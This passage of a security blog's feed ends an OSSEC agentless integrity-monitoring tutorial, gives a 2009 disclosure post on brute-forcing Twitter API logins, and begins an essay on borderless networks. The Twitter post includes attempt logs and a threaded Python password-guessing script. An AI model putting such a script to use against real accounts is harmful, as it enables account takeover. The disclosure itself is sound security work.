RSA key fingerprint is 14:cd:f2:e9:c3:5b:07:28:68:75:a7:b5:88:c2:6b:77.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;172.17.20.20&#39; (RSA) to the list of known hosts.
Last login: Tue Oct  6 12:40:05 2009 from 172.17.20.154
[linux26.ptnsecurity.com ~]# exit
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;add-the-agentless-host-to-ossec-conf:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Add the agentless host to ossec.conf&lt;/h4&gt;

&lt;p&gt;While we have setup and prepared everything to allow agentless
security monitoring of &lt;code&gt;172.17.20.20&lt;/code&gt; we have not told ossec to
make use of it. To simplify adding agentless to the config, we
are going to make use of the python library and tools I created
&lt;a href=&#34;http://bitbucket.org/jrossi/ossec-hids-tools/&#34;&gt;ossec-hids-tools&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First, let&amp;rsquo;s check to see what agentless hosts have been configured, and
just like a good unix program, it should not output anything if nothing
happens.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --show
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, add our host to the configuration. I am using the OSSEC supplied
script &lt;code&gt;ssh_integrity_check_linux&lt;/code&gt;. This script will login to the remote
host and send back to the OSSEC server via stdout an MD5 and SHA1 hash
of every single file inside the paths specified in the arguments. To
demonstrate the output from the server, let&amp;rsquo;s test the script and review
said output.&lt;/p&gt;

&lt;p&gt;All testing of agentless scripts must be run from the directory
&lt;code&gt;/var/ossec/&lt;/code&gt; unless you compiled a different install location.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# cd /var/ossec
obsd46# sudo -u ossec ./agentless/ssh_integrity_check_linux root@172.17.20.20 /etc
spawn ssh root@172.17.20.20
Last login: Mon Nov  2 17:53:23 2009 from 172.17.20.131
[tss-uvc-01v.ptn.local ~]#
INFO: Started.
t -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; echo FWD: `stat --printf &amp;quot;%s:%a:%u:%g&amp;quot; $i`:$md5:$sha1 $i; done; exit md5=`md5sum $i | cut -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum $i | cu
INFO: Starting.
FWD: 14612:644:0:0:509377d820692110c7a6cc83ef2c2da8:bf610c1fa14d84d8b3b44ec80b81788457f77420 /etc/sound/events/gtk-events-2.soundlist
FWD: 22291:644:0:0:d6139aa9554d4997ea25ec2d56095f51:26b9ae7784943eecaeb2dcd4b2ae3a32371d61c8 /etc/sound/events/gnome-2.soundlist
FWD: 83:644:0:0:9f87609f65b51761657c7d67881ae582:de82c03c535e9deb16aed94153883280891da2d7 /etc/modprobe.d/blacklist-firewire
^C^C#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I only let the script run for a few seconds to see the output, but the
key things to notice are the lines beginning with &amp;ldquo;INFO&amp;rdquo; or &amp;ldquo;FWD&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Anything that starts with &amp;ldquo;&lt;code&gt;INFO&lt;/code&gt;&amp;rdquo; is logged to the
&lt;code&gt;/var/ossec/logs/ossec.log&lt;/code&gt; file for debugging and troubleshooting, we
will make use of this later on in this blog. The &amp;ldquo;&lt;code&gt;FWD&lt;/code&gt;&amp;rdquo; tag at the
beginning of the line lets the OSSEC server store the HASH information.
Where this becomes useful is when a file&amp;rsquo;s contents change, the HASH
will in turn change and OSSEC is able to notify you when this happens.&lt;/p&gt;

&lt;p&gt;Now let&amp;rsquo;s complete adding our host to the OSSEC configuration.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --add --host root@172.17.20.20 --type ssh_integrity_check_linux \
--state periodic --argv &amp;quot;/bin /etc /sbin&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s verify it&amp;rsquo;s what we expect.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --show
----------------------------------------
type: ssh_integrity_check_linux
frequency: 3600
host: root@172.17.20.20
state: periodic
arguments: /bin /etc /sbin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Time to restart the deamons for the changes to take effect.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obsd46# /var/ossec/bin/ossec-control stop
Killing ossec-monitord ..
Killing ossec-logcollector ..
ossec-remoted not running ..
Killing ossec-syscheckd ..
Killing ossec-analysisd ..
Killing ossec-maild ..
ossec-execd not running ..
ossec-agentlessd not running ..
OSSEC HIDS v2.2 Stopped
obsd46# /var/ossec/bin/ossec-control start
Starting OSSEC HIDS v2.2 (by Trend Micro Inc.)...
Started ossec-agentlessd...
Started ossec-maild...
Started ossec-execd...
Started ossec-analysisd...
Started ossec-logcollector...
Started ossec-remoted...
Started ossec-syscheckd...
Started ossec-monitord...
Completed.
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;agentless-test:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Testing agentless&lt;/h3&gt;

&lt;p&gt;Checking the log files, we can see what the agentless security monitor
has done so far.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# grep agentless logs/ossec.log
2009/09/21 14:59:49 ossec-agentlessd: INFO: Started (pid: 15320).
2009/09/21 14:59:51 ossec-agentlessd: INFO: Test passed for &#39;ssh_integrity_check_linux&#39;.
2009/09/21 15:00:53 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Started.
2009/09/21 15:00:53 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Starting.
2009/09/21 15:01:34 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Finished.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we have one last thing to do to see that it&amp;rsquo;s working as expected,
make a change to the file system on &lt;code&gt;172.17.20.20&lt;/code&gt; that the ossec will
notice on the next run. I am going to change the root password for now.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ssh -i /var/ossec/.ssh/id_rsa root@172.17.20.20
Last login: Tue Oct  6 14:38:48 2009 from 172.17.20.154
[linux26.ptnsecurity.com ~]# passwd
Changing password for user root.
New UNIX password:
Retype new UNIX password:
passwd: all authentication tokens updated successfully.
[linux26.ptnsecurity.com ~]# exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Take a look at the logs for ossec-agentlessd to check the host. Again,
we see that it completed another scan.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# grep agentless logs/ossec.log
2009/09/21 15:18:27 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Started.
2009/09/21 15:18:27 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Starting.
2009/09/21 15:18:46 ossec-syscheckd: INFO: Finished creating syscheck database (pre-scan completed).
2009/09/21 15:19:06 ossec-agentlessd: INFO: ssh_integrity_check_linux: root@172.17.20.20: Finished.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that we also received the following email notifying that the
password has changed, a message that is very useful to report.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;OSSEC HIDS Notification.
2009 Sep 21 15:19:00

Received From: (ssh_integrity_check_linux) root@172.17.20.20-&amp;gt;syscheck
Rule: 550 fired (level 7) -&amp;gt; &amp;quot;Integrity checksum changed.&amp;quot;
Portion of the log(s):

Integrity checksum changed for: &#39;/etc/shadow&#39;
Old md5sum was: &#39;0d92e12c92f3edcf9d8876ea57c5f677&#39;
New md5sum is : &#39;2bd51b61dea17c5682fb2c0cf4f92c63&#39;
Old sha1sum was: &#39;2270c03a920ef8dd50e11cefdef046a8660f7a29&#39;
New sha1sum is : &#39;d9518ea9022b10d07f81925c6d7f2abb4364b548&#39;

--END OF NOTIFICATION
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;Week of OSSEC Links:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Day 1: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/25/week-of-ossec-day-1-detecting-world-writable-files/&#34;&gt;Detecting World-Writable Files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 2: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/26/week-of-ossec-day-2-detecting-new-files/&#34;&gt;Detecting New Files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 3: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/27/week-of-ossec-day-3-use-variables/&#34;&gt;Using Variables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 4: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/28/week-of-ossec-day-4-using-groups/&#34;&gt;Using Groups&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 5: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/29/week-of-ossec-day-5-reusing-rule-ids/&#34;&gt;Reusing Rule IDs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 6: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/30/week-of-ossec-day-6-developing-a-tuning-strategy/&#34;&gt;Developing a Tuning Strategy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Day 7: &lt;a href=&#34;http://www.immutablesecurity.com/index.php/2009/10/31/week-of-ossec-day-7-developing-a-workflow/&#34;&gt;Developing a Workflow&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Breaking Twitter (Authenication)</title>
      <link>https://jeremyrossi.com/blog/2009/08/25/breaking-twitter-authenication/</link>
      <pubDate>Tue, 25 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/08/25/breaking-twitter-authenication/</guid>
      <description>

&lt;p&gt;Yesterday we spent some time speculating on how phishing attacks like
the one afflicting Twitter on Wednesday of this week are seeded. How are
the original direct messages sent out that kick off the first stolen
credentials, the next set of direct messages, and so on in the loop? We
were hoping, but not counting on, the fact that Twitter might address
this in their blog. Taking a page from Google or Microsoft, an up front
and transparent approach to security seems to be the direction of
major players in the online space. Twitter may consider embracing this
approach, given its rampant rise in popularity and thus existence at the
edge of malicious customized attacks from bad actors, as it likely has a
lot of data that would benefit the information assurance community.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://praetorianprefect.com/archives/2009/09/rofl-this-you -on-here-the-latest-twitter-worm/&#34;&gt;In our rampant speculating&lt;/a&gt;
(guessing), we noted that we thought
brute force password attacks would move away from the main Twitter
login page because of their implementation of CAPTCHA (showing an
image that is easy for a human to translate and type in but difficult
for a computer to identify), which occurs after several failed login
attempts. While some success has been reported by both researchers
attempting to break CAPTCHA, as well as researchers
&lt;a href=&#34;http://securitylabs.websense.com/content/Blogs/2919.aspx&#34;&gt;watching others break it&lt;/a&gt;,
the processing time of dealing with translating thousands of
CAPTCHA messages becomes problematic from a password cracking
standpoint (as far as we know, if you have a counter example
please show us). So where does one go to perform the type of
brute force password attack that a &lt;a href=&#34;http://www.wired.com/threatlevel/2009/01/professed-twitt/&#34;&gt;teenage hacker used in January&lt;/a&gt; to
gain access to &lt;a href=&#34;http://twitter.com/crystal&#34;&gt;Crystal the Twitter admin&amp;rsquo;s&lt;/a&gt;
account, achieve &amp;lsquo;Happiness&amp;rsquo; and allow others to tweet on behalf of
Barack Obama and Britney Spears?&lt;/p&gt;

&lt;div class=&#34;panel panel-default .col-md-6&#34; &gt;
  &lt;div class=&#34;panel-body&#34;&gt;

&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg&#34; alt=&#34;Back in January the @BarackObama account was broken into.&#34; title=&#34;obama-twitter-hacked&#34; width=&#34;500&#34; height=&#34;327&#34; class=&#34;size-full wp-image-576&#34; /&gt;&lt;/a&gt;

&lt;br&gt;

Back in January the @BarackObama account was broken into.
  &lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;We thought that the Twitter API (application program interface) is
the next place to go. While moving towards OAuth authentication (a
mechanism by which users can provide others access to their data
without providing their authentication credentials) the old style
API calls with user name and password are still available. Providing
an API is one of the primary reasons for Twitter&amp;rsquo;s popularity, as
many tools can provide both interfaces into the online services
of Twitter, as well as act as aggregators for the data within
Twitter&amp;rsquo;s data stores. In fact, for most tweeple, the actual system
confines of Twitter might as well be a big database, as they are
doing their tweeting through &lt;a href=&#34;http://tweetdeck.com/&#34;&gt;TweetDeck&lt;/a&gt; or
&lt;a href=&#34;http://www.atebits.com/tweetie-iphone/&#34;&gt;Tweetie&lt;/a&gt;, monitoring topics
at &lt;a href=&#34;http://twitterfall.com/&#34;&gt;TwitterFall&lt;/a&gt;, looking at their favorite
famous twits at &lt;a href=&#34;http://www.congressional140.com&#34;&gt;Congressional140&lt;/a&gt;
or &lt;a href=&#34;http://www.celebritytweet.com/&#34;&gt;CelebrityTweet&lt;/a&gt;, mapping the
world&amp;rsquo;s tweets with &lt;a href=&#34;http://beta.twittervision.com/&#34;&gt;TwitterVision&lt;/a&gt;, or
evaluating themselves with &lt;a href=&#34;http://www.cursebird.com/&#34;&gt;CurseBird&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;That same API provides an alternate path for logging into
Twitter, and provides all the functionality available through
the web application (authentication, reading tweets, tweeting).
You can read more about the overall Twitter API here:
&lt;a href=&#34;http://apiwiki.twitter.com&#34;&gt;http://apiwiki.twitter.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;But wait you say, are you trying to tell us that brute force password
attacks will move to the API when I just read on the Twitter API wiki
that the API severely limits the rate of calls you are allowed to make
to it (200/hour/IP for authenticated requests without whitelisting)?
That should be a mitigating control. Should be, but isn&amp;rsquo;t, because it is
not enforced on all of the API calls.&lt;/p&gt;

&lt;h3 id=&#34;rate-limit-we-don-t-need-no-stinking-rate-limit:fc3b26d4d48667693f82be9f46b9b4cc&#34;&gt;Rate Limit? We don&amp;rsquo;t need no stinking rate limit.&lt;/h3&gt;

&lt;p&gt;From the twitter API documenation on
&lt;a href=&#34;http://apiwiki.twitter.com/Twitter-REST-API-Method%3A-account%C2%A0verify_credentials&#34;&gt;account/verify_credentials&lt;/a&gt;
Twitter states:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Returns an HTTP 200 OK response code and a representation of the
requesting user if authentication was successful; returns a 401 status
code and an error message if not. Use this method to test if supplied
user credentials are valid. Because this method can be a vector for a
brute force dictionary attack to determine a user&amp;rsquo;s password, it is
limited to &lt;em&gt;15 requests per 60 minute period&lt;/em&gt; (starting from your first
request).&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Well, let&amp;rsquo;s see. Using a simple python program that tried known
incorrect passwords as fast as the the API would respond (but well below
DOS thresholds), we have this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
[~]% time python twitterauthcheck.py
Login: _eeeeeeeek Password: 0 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 1 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 2 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 3 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 4 failed: HTTP Error 401: Unauthorized

[......SNIP......]

Login: _eeeeeeeek Password: 295 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 296 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 297 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 298 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 299 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: &amp;lt;redacted&amp;gt; accepted
/opt/local/bin/python2.6 testingauth.py  2.03s user 1.47s system 1% cpu 4:25.05 total
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So looking at the details we have 300 passwords attempted in 2 minutes
and 3 seconds. We can also see on the 300th attempt the password was
accepted (we put the correct password in at number 300) so we can
conclude that the account is not getting locked out due to enforcement
of rate limits. So next we ran the script six times concurrently (3,600
attempts). Still not locked out.&lt;/p&gt;

&lt;p&gt;We are also showing that we are able to blow through the overall 150
request limit per IP per hour that Twitter reports is the rate limit.
Running multiple attempts did start to hit some 503 Bad Gateway errors
which we thought might be the end of the road, but no, it started
responding again a second later.&lt;/p&gt;

&lt;p&gt;Running the script is slow. Twitter&amp;rsquo;s greatest defense here against
a true brute force attack using a single thread is that it takes a
while for their infrastructure to respond. We can call that security
through lack of capacity. Since a good password cracker takes more then
a few hundred entries to work (&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/dic.tx t&#34;&gt;this LOphtCrack dictionary has 235,007 entries.&lt;/a&gt;),
we&amp;rsquo;ll go multi-threaded.&lt;/p&gt;

&lt;p&gt;In a final controlled example, we use a known account where one person
sets a dictionary word simple password and the other person runs the
script without specifically knowing the password (just in case someone
wants to write a Computer Fraud and Abuse Act essay in the comments,
when someone logs into their own account its called authentication).
Again, low request threshold, and only accessing our own account.&lt;/p&gt;

&lt;p&gt;25,086 attempts thus far before we got bored watching it, so a little
over 7 hours and the whole 200,000+ dictionary word list would be done,
and likely any account using a common dictionary based password would
be accessed. We tried a few subsequent runs that mixed in a correct
password just to ensure everything was working, and the program notified
us of the successful login.&lt;/p&gt;

&lt;p&gt;If Twitter wants to minimize the probability of success for this
vulnerability it could:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Enforce its stated rate limits.&lt;/li&gt;
&lt;li&gt;Start requiring minimally complex passwords.&lt;/li&gt;
&lt;li&gt;Complete the migration to OAuth.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we like Twitter as much as the next, and because we are in favor of
good faith disclosure, we have notified them of our concerns. &lt;em&gt;Update&lt;/em&gt;:
A Twitter representative has responded that the information provided has
been sent on to the right internal team at Twitter.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s the Code: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/threadedtwitter.py.txt&#34; title=&#34;threadedtwitter.py&#34;&gt;threadedtwitter.py&lt;/a&gt;
&lt;br&gt;
Dictionary: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/dic.txt&#34; title=&#34;dic.txt&#34;&gt;dic.txt&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Please note, the code is provided for demonstration purposes only, should not be run ever, and contains intentional errors so that attempts to run it will not work.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The command is as follows: &lt;code&gt;twitterauthcheck.py username passwordlist.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import threading,Queue
import socket
import tweethon
import urllib2
import socket
import sys

class Threader:
    # Class taken from: Sept 3 2004, Justin A: http://code.activestate.com/recipes/302746/
    def __init__(self, numthreads):
        self._numthreads=numthreads

    def get_data(self,):
        raise NotImplementedError, &amp;quot;You must implement get_data as a function that returns an iterable&amp;quot;
        return range(10000)
    def handle_data(self,data):
        raise NotImplementedError, &amp;quot;You must implement handle_data as a function that returns anything&amp;quot;
        time.sleep(random.randrange(1,5))
        return data*data
    def handle_result(self, data, result):
        raise NotImplementedError, &amp;quot;You must implement handle_result as a function that does anything&amp;quot;
        print data, result

    def _handle_data(self):
        while 1:
            x=self.Q.get()
            if x is None:
                break
            self.DQ.put((x,self.handle_data(x)))

    def _handle_result(self):
        while 1:
            x,xa=self.DQ.get()
            if x is None:
                break
            self.handle_result(x, xa)

    def run(self):
        if hasattr(self, &amp;quot;prerun&amp;quot;):
            self.prerun()
        self.Q=Queue.Queue()
        self.DQ=Queue.Queue()
        ts=[]
        for x in range(self._numthreads):
            t=threading.Thread(target=self._handle_data)
            t.start()
            ts.append(t)

        at=threading.Thread(target=self._handle_result)
        at.start()

        try :
            for x in self.get_data():
                self.Q.put(x)
        except NotImplementedError, e:
            print e
        for x in range(self._numthreads):
            self.Q.put(None)
        for t in ts:
            t.join()
        self.DQ.put((None,None))
        at.join()
        if hasattr(self, &amp;quot;postrun&amp;quot;):
            return self.postrun()
        return None


class twitterpasswordtester(Threader):

    def get_data(self):
        data = open(sys.argv[2]).read()
        data = data.split(&#39;\n&#39;)
        self._usename = sys.argv[1]
        self.counter = 0
        return data

    def handle_data(self,p):
        print &amp;quot;in testAuth&amp;quot;
        u = self._usename
        x = tweethon.Api(username=u, password=p)
        x.SetCache(None)
        try:
            x.VerifyCredentials()
            results = &amp;quot;login: {0} Password: {1} accepted\n&amp;quot;.format(u, p)
        except urllib2.HTTPError, e:
            results = &amp;quot;login: {0} Password: {1} failed: {2}\n&amp;quot;.format(u, p, e)
        finally:
            del x
            return results

    def handle_result(self, data, result):
        print result
        print self.counter 
        self.counter += 1
        self.res.append((data,result))
    def prerun(self):
        self.res=[]
    def postrun(self):
        return self.res


z = twitterpasswordtester(10)
for n,ns in  a.run():
    print n,ns
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tweethon Source: &lt;a href=&#34;http://bitbucket.org/jrossi/tweethon/src/tip/README&#34;&gt;http://bitbucket.org/jrossi/tweethon/src/tip/README&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The Tweethon library, the only custom or uncommon library above, is intended to make the &lt;a href=&#34;http://twitter.com/help/api&#34;&gt;Twitter web services API&lt;/a&gt; easier for python programmers to use.&lt;/em&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Are borderless networks possiable?</title>
      <link>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</link>
      <pubDate>Sat, 15 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</guid>
      <description>

&lt;p&gt;I attended &lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;
in New York this week and a keynote from Cisco caught my attention: &lt;em&gt;Securing
the Cloud: Building the Borderless Network&lt;/em&gt;.  I became fixated on the words
used over and over by &lt;a href=&#34;http://www.scmagazineus.com/Joel-McFarland-senior-manager-Product-Management-Security-Technology-Group-Cisco-Systems/article/149536/&#34;&gt;Joel McFarland&lt;/a&gt;.
Borderless this, borderless that, borderless everything.  This campaign started
to bother me as this was a security conference and a network company was
pushing the idea of less borders.  It seemed off, wrong, and incomplete to me.&lt;/p&gt;

&lt;h2 id=&#34;little-bit-of-history:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Little Bit of History&lt;/h2&gt;

&lt;p&gt;I am going to quickly cover some of the history of the Internet and how it
grew borders, but please skip to the highlight of the article if you are
familiar with this already: &lt;a href=&#34;#borderless-what&#34;&gt;Borderless Networks, What?&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;arpanet-69-91:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;ARPANET (&amp;lsquo;69-&amp;lsquo;91)&lt;/h4&gt;

&lt;p&gt;In the beginning, there was &lt;a href=&#34;http://en.wikipedia.org/wiki/ARPANET&#34;&gt;ARPANET&lt;/a&gt;
which was the pioneer in packet switching networks and gave providers the
choice of which method and hardware for communication it would use.  However,
the base protocol used for devices to communicate in ARPANET was NCP.&lt;br /&gt;
The NCP  protocol could best be described as a network device driver and
less as a network transport stack. It did not have any method for end-to-end
error handling which was seen as a problem, but nothing was done about
this until 1983.&lt;/p&gt;

&lt;p&gt;In 1983, TCP/IP replaced NCP as the protocol for transport and ARPANET became
a part of what was to become the Internet.  TCP/IP was a huge improvement
over NCP in that it accounted for problems on the network and allowed the
network not to come to a grinding halt when packets were lost.  It also
achieved the concept of end-to-end connectivity between each host.  This
meant that as long as two hosts were on the Internet they could reach
each other by utilizing standard TCP/IP.  This standard framework also
lead to the growth of many different applications as there was no longer
any need to make changes to the network to add new applications/protocols.&lt;/p&gt;

&lt;h4 id=&#34;first-borders-91-94:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;First Borders (&amp;lsquo;91-&amp;lsquo;94)&lt;/h4&gt;

&lt;p&gt;All the building blocks were in place and  what formed was a large group
of interconnected networks to share and exchange data. Then the first virus
and worm hit in 1983 and 1988 respectively.  The
&lt;a href=&#34;http://en.wikipedia.org/wiki/Morris_worm&#34;&gt;morris worm&lt;/a&gt; gained a fair amount
of media attention and in fact prompted the establishment of &lt;a href=&#34;http://www.cert.org/&#34;&gt;CERT
&lt;/a&gt;.  Even in this embryonic stage the vitality of the
information being shared caused many researchers to begin placing limitations
on the end-to-end connectivity of their hosts.  Thus began the &lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt;
and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; status of the Internet.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt; and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; started out simple with a move to keep
networks segregated-or put another way, adding a border
between the networks. At first, the borders were nothing more
than routers that limited the effects from network &lt;em&gt;A&lt;/em&gt; from
spilling over into network &lt;em&gt;B&lt;/em&gt;. They were effective, but in 1991
&lt;a href=&#34;http://en.wikipedia.org/wiki/Digital_Equipment_Corporation&#34;&gt;DEC&lt;/a&gt;
released the first modern Firewall: SEAL. This marked the first real
security border on the Internet, where all packets were inspected and
compared to a set of policy rules before being passed on. These first
security borders were instrumental in providing the trust and assurance
in the network that companies and researchers required, speeding the
growth of the Internet. While intrusion was still possible, the bar of
entry was raised beyond causal attacks and probes.&lt;/p&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/statis/img/us-them.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;300&#34; height=&#34;233&#34; /&gt; &lt;/a&gt;
&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;Figure 1: Us vs. Them&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;In 1992, the dominant addressing of hosts was IPv4, where each host is a
assigned a 32-bit address.  This assignment limited the total number of
addressable hosts to 4,294,967,296, but, due to reservations and subnetting,
this could never be fully utilized.  At this time, it was recognized that
IPv4 limitations would be become a problem in the future, beginning
the process of creating a new IP protocol with a much higher number
of addressable hosts. IPv6 was born in 1994, based on a 128-bit
address for each host.  This would effectively allow every man,
woman, and child on Earth to be assigned an address many times over.&lt;br /&gt;
As a part of the formation of IPv6, security between networks was
also taken into account and &lt;a href=&#34;http://en.wikipedia.org/wiki/IPsec&#34;&gt;IPSec&lt;/a&gt;
was created as a requirement of the IPv6 protocol.&lt;/p&gt;

&lt;p&gt;IPv6&amp;rsquo;s creation gave the Internet a secure method of communications
between networks via IPSEC and nearly unlimited address space, but
IPv6 did not get off the ground quickly.  This was mostly due to the
fact that all devices and operating systems would need to be upgraded to
handle the new protocol, and there was little to no pressure from the
market to push things forward.   IPSec on the other hand did take off,
as it quickly became the standard method for interconnecting trusted
networks over an untrusted medium (such as the Internet).&lt;/p&gt;

&lt;p&gt;At the same time that IPv6 and IPSec were being developed, another
group of people began working on an alternate method for dealing
with the lack of addressable space in IPv4.&lt;br /&gt;
&lt;a href=&#34;http://en.wikipedia.org/wiki/Network_address_translation&#34;&gt;Network Address Translation (NAT)&lt;/a&gt;
was published in &lt;a href=&#34;http://www.ietf.org/rfc/rfc1631.txt&#34;&gt;RFC1631&lt;/a&gt; in 1994
as a short term solution, while the larger problems were being
addressed.  NAT became very successful quickly as it allows a very
large number of hosts to access the larger Internet while using very
few publicly addressable IP addresses.  As with most things, NAT came
with some trade-offs.  One of the big ones was that hosts no longer
had complete end-to-end connectivity.  Thus, another border on the
network was created; in practice firewalls became the dominate NAT
devices.  Nonetheless, the NAT border would create problems for
applications developers for years to come.&lt;/p&gt;

&lt;h4 id=&#34;present-09:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Present (&amp;lsquo;09)&lt;/h4&gt;

&lt;p&gt;In 2009, the way Internet runs is really not very different from
1994;  IPv6 is just now getting underway, NAT is used everywhere,
and IPSEC still secures networks over an untrusted medium. What
has changed in a big way is the applications and uses of the Internet.&lt;br /&gt;
Telephone calls commonly use the Internet for transport, on demand
video is a huge source of traffic, social media networks garner huge
numbers of users, online shopping is an important revenue stream for
companies, and most recently more and more services are being
hosted elastically on demand via the Internet.&lt;/p&gt;

&lt;h2 id=&#34;borderless-what:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless Networks. What?&lt;/h2&gt;

&lt;p&gt;Now let&amp;rsquo;s get back to Borderless Networks&amp;hellip;&lt;/p&gt;

&lt;p&gt;Cisco envisions a global network where you can go any place
and access any data you could need at anytime.  John Chambers
detailed the approach on a video at &lt;a href=&#34;http://cisco.com&#34;&gt;Cisco.com&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In terms of what&amp;rsquo;s happening right now, I think the biggest market transition
